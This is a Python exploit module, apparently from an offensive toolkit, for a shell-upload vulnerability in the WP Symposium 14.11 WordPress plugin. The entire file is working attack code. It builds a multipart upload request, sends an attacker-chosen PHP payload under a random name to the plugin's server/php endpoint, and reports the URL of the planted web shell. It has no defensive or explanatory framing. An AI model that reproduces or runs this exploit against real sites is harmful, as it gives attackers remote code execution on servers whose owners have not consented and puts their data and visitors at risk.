##
## Wordpress WP Symposium 14.11 Shell Upload Vulnerability
##

from core.misc import printf
import urllib2
import socket
import os
import random
import string
import mimetypes

def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
def id_gen():
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(6))
def create(payloadname, randDirName, randShellName,url_upload):
   getfields = dict()
   getfields['uploader_uid'] = '1'
   getfields['uploader_dir'] = './'+randDirName
   getfields['uploader_url'] = url_upload
   payloadcontent = open(payloadname).read()

   LIMIT = '----------lImIt_of_THE_fIle_eW_$'
   CRLF = '\r\n'

   L = []
   for (key, value) in getfields.items():
      L.append('--' + LIMIT)
      L.append('Content-Disposition: form-data; name="%s"' % key)
      L.append('')
      L.append(value)

   L.append('--' + LIMIT)
   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))
   L.append('Content-Type: %s' % get_content_type(payloadname))
   L.append('')
   L.append(payloadcontent)
   L.append('--' + LIMIT + '--')
   L.append('')
   body = CRLF.join(L)
   return body
def exploit_wp(url,file):
    if 'http' not in url:
        try:
            urllib2.urlopen('http://' + url)
            site = 'http://' + url
        except:
            site = 'https://' + url
    else:
        site = url
    printf('[+] Create random directory and shell..')
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        printf('[!] File is missing or not readable',2)
        return
    socket.setdefaulttimeout(10)
    url_upload = site + '/wp-content/plugins/wp-symposium/server/php/'
    content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'
    rand_dirname = id_gen()
    rand_shellname = id_gen()
    body = create(file,rand_dirname,rand_shellname,url_upload)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/36.0.1985.125 Safari/537.36',
           'content-type': content_type,
           'content-length': str(len(body)) }
    printf('[+] Start upload %s to %s' % (file,site))
    req = urllib2.Request(url_upload+'index.php', body, headers)
    response = urllib2.urlopen(req)
    read = response.read()
    if "error" in read or read == "0" or read == "":
        printf('[!] Upload failed, maybe site isn\'t vulnerable!')
    else:
        printf('[+] Success uploaded')
        printf('[+] Location: %s' % url_upload+rand_dirname+rand_shellname+'.php')
